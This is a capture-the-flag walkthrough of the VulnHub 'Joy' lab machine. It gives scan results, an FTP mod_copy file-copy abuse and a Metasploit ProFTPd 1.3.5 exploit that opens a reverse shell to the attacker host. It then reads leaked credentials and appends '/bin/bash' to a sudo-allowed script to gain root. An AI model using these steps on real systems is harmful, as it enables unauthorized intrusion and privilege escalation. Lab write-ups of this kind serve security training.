Joy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] FTP browsing
[+] ProFTFp 1.3.5 exploitation
[+] Privilege Escalation abusing SUDO rights - /script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.103
Host is up (0.00062s latency).
Not shown: 988 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.2.10
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA SASL PIPELINING TOP STLS AUTH-RESP-CODE UIDL RESP-CODES
|_ssl-date: TLS randomness does not represent time
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more IDLE have ID LITERAL+ STARTTLS LOGIN-REFERRALS OK LOGINDISABLEDA0001 Pre-login capabilities SASL-IR listed post-login ENABLE IMAP4rev1
|_ssl-date: TLS randomness does not represent time
445/tcp open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
465/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp        Postfix smtpd
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3s?
MAC Address: 08:00:27:C8:57:1E (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: The,  JOY.localdomain, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 19m58s, deviation: 4h37m07s, median: 2h59m58s
|_nbstat: NetBIOS name: JOY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.12-Debian)
|   Computer name: joy
|   NetBIOS computer name: JOY\x00
|   Domain name: \x00
|   FQDN: joy
|_  System time: 2019-10-20T14:10:39+08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-10-20 02:10:39
|_  start_date: N/A

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Connecting to Anonymous ftp. In the upload folder there is a directory file that contains listing of the home directory for user patrick.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ cat directory 
Patrick's Directory

total 108
drwxr-xr-x 18 patrick patrick 4096 Oct 20 14:10 .
drwxr-xr-x  4 root    root    4096 Jan  6  2019 ..
-rw-------  1 patrick patrick  185 Jan 28  2019 .bash_history
-rw-r--r--  1 patrick patrick  220 Dec 23  2018 .bash_logout
-rw-r--r--  1 patrick patrick 3526 Dec 23  2018 .bashrc
drwx------  7 patrick patrick 4096 Jan 10  2019 .cache
drwx------ 10 patrick patrick 4096 Dec 26  2018 .config
-rw-r--r--  1 patrick patrick    0 Oct 20 14:10 dbmejYmQWeL2m8LZJ7930x0t5RC9aklm.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Desktop
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Documents
drwxr-xr-x  3 patrick patrick 4096 Jan  6  2019 Downloads
drwx------  3 patrick patrick 4096 Dec 26  2018 .gnupg
-rwxrwxrwx  1 patrick patrick    0 Jan  9  2019 haha
-rw-------  1 patrick patrick 8532 Jan 28  2019 .ICEauthority
drwxr-xr-x  3 patrick patrick 4096 Dec 26  2018 .local
drwx------  5 patrick patrick 4096 Dec 28  2018 .mozilla
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick 4096 Jan  8  2019 .nano
-rw-r--r--  1 patrick patrick   24 Oct 20 14:10 ngs7iQY7aAmn7TXBpOB5em9D9RUYqkdqChgasz8ZDYXBHygJrQvPzeddYir6ZPFm.txt
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick  675 Dec 23  2018 .profile
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Public
d---------  2 root    root    4096 Jan  9  2019 script
drwx------  2 patrick patrick 4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 Sun
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick  407 Jan 27  2019 version_control
drwxr-xr-x  2 patrick patrick 4096 Dec 26  2018 Videos

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Trying to put version_control in the ftp - upload folder.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ telnet 192.168.56.103 21
Trying 192.168.56.103...
Connected to 192.168.56.103.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
site cpto /home/ftp/upload/version_control
250 Copy successful

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to version_control on ftp we get the version of the ftp service running.

![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Joy/joy.png)

Versions  : ProFTPd :  1.3.5
Webroot :  /var/www/tryingharderisjoy

Searching for exploits

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/joy# searchsploit proftp 1.3.5
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                      |  Path
                                                                                                                                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                           | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                 | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                                           | exploits/linux/remote/36742.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Exploiting ProFTPd 1.3.5

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msf5 > use exploit/unix/ftp/proftpd_modcopy_exec 
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > show options 

Module options (exploit/unix/ftp/proftpd_modcopy_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ProFTPD 1.3.5


msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set rhosts 192.168.56.103
rhosts => 192.168.56.103
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > set sitepath /var/www/tryingharderisjoy
sitepath => /var/www/tryingharderisjoy
msf5 exploit(unix/ftp/proftpd_modcopy_exec) > run

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] 192.168.56.103:80 - 192.168.56.103:21 - Connected to FTP server
[*] 192.168.56.103:80 - 192.168.56.103:21 - Sending copy commands to FTP server
[*] 192.168.56.103:80 - Executing PHP payload /ngTVeKd.php
[*] Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.103:53512) at 2019-10-19 23:33:14 -0400
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@JOY:/var/www/tryingharderisjoy$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@JOY:/var/www/tryingharderisjoy/ossec$ 
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy	
cat patricksecretsofjoy 
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
www-data@JOY:/var/www/tryingharderisjoy/ossec$ 

www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
su patrick
Password: apollo098765

patrick@JOY:/var/www/tryingharderisjoy/ossec$ 
patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test

patrick@JOY:~$ sudo /home/patrick/script/test
sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
What permissions would you like to set the file to?
777 /home/patrick/script
777 /home/patrick/script

Currently changing file permissions, please wait.
Tidying up...
Done!
patrick@JOY:~$ 
patrick@JOY:~$ cd script
patrick@JOY:~/script$ 
patrick@JOY:~/script$ ls -al
ls -al
total 56
drwxrwxrwx  2 root    root     4096 Jan  9  2019 .
drwxr-xr-x 18 patrick patrick  4096 Oct 20 14:50 ..
-rw-r--r--  1 patrick patrick 42666 Jan  8  2019 joy.jpg
-rwxr-x---  1 patrick patrick   414 Jan  9  2019 test
patrick@JOY:~/script$ 
patrick@JOY:~/script$ cat test	
cat test 
#!/bin/sh

echo "I am practising how to do simple bash scripting!"
sleep 3

echo "What file would you like to change permissions within this directory?"

read file
sleep 3

echo "What permissions would you like to set the file to?"

read permissions
sleep 3

echo "Currently changing file permissions, please wait."
sleep 3

chmod $permissions /home/patrick/script/$file
echo "Tidying up..."
sleep 3

echo "Done!"
patrick@JOY:~/script$ 
patrick@JOY:~/script$ echo '/bin/bash' >> test
echo '/bin/bash' >> test
patrick@JOY:~/script$ 

patrick@JOY:~/script$ sudo /home/patrick/script/test
sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
What permissions would you like to set the file to?
GIVE ME ROOT
GIVE ME ROOT

Currently changing file permissions, please wait.
chmod: invalid mode: ‘GIVE’
Try 'chmod --help' for more information.
Tidying up...
Done!
root@JOY:/home/patrick/script# 
root@JOY:/home/patrick/script# id
id
uid=0(root) gid=0(root) groups=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


